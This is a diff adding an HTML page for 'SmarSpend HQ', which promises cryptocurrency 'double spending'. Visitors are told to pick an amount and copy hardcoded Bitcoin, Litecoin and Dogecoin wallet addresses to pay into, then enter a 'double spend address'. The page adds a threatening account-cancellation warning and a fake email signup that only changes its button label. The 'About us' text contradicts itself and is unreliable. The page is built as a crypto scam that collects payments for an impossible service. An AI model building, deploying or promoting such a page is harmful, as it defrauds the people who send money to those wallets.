@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="styleb.css">
+	<link rel="stylesheet" href="estilo.css">
+    <script src="menu.js"></script>
+    <link rel="shortcut icon" href="https://c8.alamy.com/zooms/9/41a9a3b1c24c445ba8e3a941a0506bc3/2bxmt6m.jpg" type="image/x-icon">
+    <style>
+        *
+      {    
+        margin:0px;
+        padding:0px;
+      }  
+      #particles-js
+      {
+        top:0;
+        z-index:-1 ;
+      }
+      #sky {
+        font-family: monospace;
+        text-align: center;
+        font-size: 24px;
+        position: absolute;
+      }
+
+      
+    </style>
+
+</head>
+<body>
+
+   <main id="sky">
+   
+
+
+
+
+
+    <div id="menu">
+      <div id="menu-bar" onclick="menuOnClick()">
+        <div id="bar1" class="bar"></div>
+        <div id="bar2" class="bar"></div>
+        <div id="bar3" class="bar"></div>
+      </div>
+      <nav class="nav" id="nav">
+        <ul>
+          <li><a href="data1.html">Your Transactions</a></li>
+          <li><a href="faq1.html" style ="margin-left: -32px;">Faq</a></li>
+          <li><a href="chatbot1.html" style="margin-left: -24px;">Support live</a></li>
+          <li><a href="tables.html" style="margin-left: -100px; margin-top: -100px;">Earn</a></li>
+        </ul>
+      </nav> 
+    </div>
+
+   <div class="menu-bg" id="menu-bg"></div>
+
+    <h1>SmarSpend HQ</h1>
+
+   <p id="panel">Panel of double expenses to be carried out</p>
+
+    <p id="panel2">Select the amount of double spend to make: </p>
+
+    <div class="select-container ds-container">
+      <select class="form-control ds-select" id="double-spend-amount" ng-model="vm.borderStyle" ng-change="vm.textbox()">
+        <option>2 USD </option>
+        <option>5 USD *</option>
+        <option >10 USD*</option>
+        <option >24 USD*</option>
+        <option>56 USD*</option>
+        <option >100 USD*</option>
+      </select>
+    </div>
+
+    <p id="chile">Select the cryptocurrency to spend and copy the address</p>
+
+      
+  </div>
+
+  <div class="select-container ds-container">
+    <select class="form-control ds-select" id="crypto-select" onchange="updateAddress()">
+      <option value="bitcoin">Bitcoin</option>
+      <option value="wrapped-bitcoin">Wrapped Bitcoin</option>
+      <option value="litecoin">Litecoin</option>
+      <option value="usdt">Usdt</option>
+      <option value="tron">Tron</option>
+      <option value="dogecoin">Dogecoin</option>  
+    </select>
+  </div>
+
+  <input type="text" id="direccion" value="" readonly>
+      <br>
+      <br>
+      <button onclick="copyToClipboard()">Copy</button>
+   
+      <script> 
+        var direcciones = {
+          'bitcoin': 'bc1qpqlh8pvmkt7es6ed9kyl6q5rpra2pz6dksw8h8',
+          'wrapped-bitcoin': '0x2b3c4d5e6f7a8b9c',
+          'litecoin': 'ltc1q6s7y6mspa3pmxmvmzgkyfgrddz8c6zzrpx46yd',
+          'usdt': '0x4d5e6f7a8b9c0d1e',
+          'tron': '0x5e6f7a8b9c0d1e2f',
+          'dogecoin': 'DDeHhgWCun7AR4AEAqaytyANmfwN4SuJyi'
+        };
+      
+        function updateAddress() {
+          var selectedOption = document.getElementById("crypto-select").value;
+          var address = direcciones[selectedOption];
+          document.getElementById("direccion").value = address;
+        }
+        
+        function copyToClipboard() {
+          var copyText = document.getElementById("direccion");
+          copyText.select();
+          document.execCommand("copy");
+          var copyButton = document.getElementsByTagName("button")[0];
+          copyButton.innerHTML = "Copied!";
+        }
+      </script>
+
+ <style>
+  #margen {
+    font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+    background-color: white;
+    border: 1px solid black;
+    color: rgb(238, 10, 10);
+    text-shadow: 1px 1px 1px rgb(255, 255, 255);
+    font-size: 21px;
+
+
+  }
+  </style>
+  <div class="warning warning-message" id="margen">⚠️ You Can Only Make A Maximum Of Two Expenses Per Day If You Try To Make More Than 2 Your Permanent Account Will Be Canceled ⚠️</div>
+  
+
+<p id="mati">Enter the deposit address:</p>
+
+<input type="text" id="deposit-address">
+
+<p id="elmati">Enter double spend address:</p>
+
+
+<input type="text" id="double-spend-address" class="css-input">
+<div id="message"></div>
+<div class="wallet">
+  <p id="waiting-message">waiting to make the transaction...</p>
+    <p></p>
+
+    <div class="zpinner"></div>
+
+
+    <div class="balance">Saldo de gasto: <span id="wallet-balance">0.0000</span></div>
+<p></p>
+<button type="button" name="myButton" onclick="sendTransactions()">Make Double Spend Now</button>
+<br>
+<br>
+<div id="sending-message" style="display:none;">Sending transactions, please wait...</div>
+
+<script src="script.js"></script>
+<script src="cambio.js"></script>
+
+
+<style>
+  h4 {
+    display: flex;
+    flex-direction: row;
+    color: rgb(0, 0, 0);
+    font-size: 18px;
+  }
+  
+  h4:before,
+  h4:after {
+    content: "";
+    flex: 1 1;
+    border-bottom: 2px solid #000;
+    margin: auto;
+  }
+  
+  
+</style>
+
+<h4>About us</h4>
+  
+    <br>
+    
+    <div  id="vivo"class="warning warning-message">Summary of what the Double Spend is</div>
+
+    <p id="reddit-resumen"> Smart Spend HQ is a revolutionary new financial tool that allows users to spend their cryptocurrency on multiple blockchain networks at once. It eliminates the need to continually convert between different cryptocurrencies and the need to pay transaction fees on each transaction. With Crypto Double Spending, users can spend their cryptocurrency with the assurance that their funds are protected from double spending. This innovative tool offers a number of benefits, including increased security, more seamless transactions, and cost savings. Crypto Double Spending is the perfect solution for those who want to take advantage of the advantages of cryptocurrency without the risk of double spending</p>
+    
+    <p></p>
+    <p></p>
+
+    <div  id="vivo2" class="warning warning-message">Benefits of using Smart Spend HQ</div>
+
+    <p id="reddit-resumen2"> Smart Spend HQ offers a variety of benefits for those who want to use cryptocurrency as a payment method. With this tool, users can make exchanges and P2P sales without the risk of double spending. Additionally, it provides increased security, more seamless transactions, and cost savings. By using Crypto Double Spending, users can experience the advantages of cryptocurrency without the worry of double spending. This makes it the perfect financial tool for those looking to make the most of their cryptocurrency</p>
+
+    
+    <div id="warning-msg" class="warning warning-message">Send us your suggestions to improve in the future to our email</div>
+    <p></p>
+    <div id="eth"class="warning warning-message"> smartspendinghq@gmail.com</div>
+    <p></p>
+         <p id="reddit-resumen3">Enter your email to receive the latest news about this service </p>
+         <p></p>
+    <input type="text" id="emailaddress">
+    <p></p>
+    <p></p>
+
+    <button id="sendButton" onclick="sendMessage()">Send</button>
+    <head>
+      <title>Boton Send</title>
+      <style>
+        #sendButton{
+          margin-left: auto;
+          margin-right: auto;
+          display: block;
+        }
+      </style>
+    </head>
+<script>
+      function sendMessage() {
+        document.getElementById("sendButton").innerHTML = "Sending...";
+        setTimeout( () => document.getElementById("sendButton").innerHTML = "Sent!", 4000);
+      }
+    </script>
+
+
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+<p></p>
+
+
+<footer>
+
+  <p >© Smart Spend HQ all rights reserved</p>
+</footer>
+
+   </main>
+
+
+ <div id="particles-js"> </div>
+
+    <script src="particles.min.js"> </script>
+    <script >
+        particlesJS(
+          {
+  "particles": {
+    "number": {
+      "value": 80,
+      "density": {
+        "enable": true,
+        "value_area": 789.1476416322727
+      }
+    },
+    "color": {
+      "value": "#ff0c0c"
+    },
+    "shape": {
+      "type": "polygon",
+      "stroke": {
+        "width": 0,
+        "color": "#000000"
+      },
+      "polygon": {
+        "nb_sides": 7
+      },
+      "image": {
+        "src": "img/github.svg",
+        "width": 100,
+        "height": 100
+      }
+    },
+    "opacity": {
+      "value": 0.5,
+      "random": false,
+      "anim": {
+        "enable": false,
+        "speed": 1,
+        "opacity_min": 0.1,
+        "sync": false
+      }
+    },
+    "size": {
+      "value": 3,
+      "random": false,
+      "anim": {
+        "enable": false,
+        "speed": 40,
+        "size_min": 0.1,
+        "sync": false
+      }
+    },
+    "line_linked": {
+      "enable": true,
+      "distance": 150,
+      "color": "#000000",
+      "opacity": 0.4,
+      "width": 1.6034120608655213
+    },
+    "move": {
+      "enable": true,
+      "speed": 6,
+      "direction": "none",
+      "random": false,
+      "straight": false,
+      "out_mode": "out",
+      "bounce": false,
+      "attract": {
+        "enable": false,
+        "rotateX": 600,
+        "rotateY": 1200
+      }
+    }
+  },
+  "interactivity": {
+    "detect_on": "canvas",
+    "events": {
+      "onhover": {
+        "enable": false,
+        "mode": "repulse"
+      },
+      "onclick": {
+        "enable": true,
+        "mode": "push"
+      },
+      "resize": true
+    },
+    "modes": {
+      "grab": {
+        "distance": 400,
+        "line_linked": {
+          "opacity": 1
+        }
+      },
+      "bubble": {
+        "distance": 400,
+        "size": 40,
+        "duration": 2,
+        "opacity": 8,
+        "speed": 3
+      },
+      "repulse": {
+        "distance": 200,
+        "duration": 0.4
+      },
+      "push": {
+        "particles_nb": 4
+      },
+      "remove": {
+        "particles_nb": 2
+      }
+    }
+  },
+  "retina_detect": true
+}
+        )
+     </script>
+</body>
+</html>
